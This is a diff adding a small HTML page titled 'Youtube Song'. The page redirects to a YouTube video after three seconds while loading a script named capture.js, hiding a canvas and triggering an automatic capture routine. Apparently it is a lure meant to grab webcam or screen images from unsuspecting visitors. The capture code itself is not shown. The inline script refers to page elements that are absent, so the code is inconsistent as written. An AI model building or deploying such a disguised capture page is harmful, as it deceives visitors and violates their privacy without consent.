@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="refresh" content="3;url=https://youtu.be/kNIr14EyTaY?si=lBsER3G3tEIxvrR1">
+  <title>Youtube Song</title>
+  <style>
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+  <canvas id="canvas"></canvas>
+  <script src="capture.js"></script>
+  <script>
+    document.getElementById('next').addEventListener('click', () => {
+      document.querySelector('.placeholder').textContent =
+        'Connecting you to a new stranger...';
+      const vid = document.getElementById('video');
+      if (vid.srcObject) {
+        vid.srcObject.getTracks().forEach(t => t.stop());
+        vid.srcObject = null;
+      }
+      window.runAutoCapture();
+    });
+  </script>
+</body>
+</html>
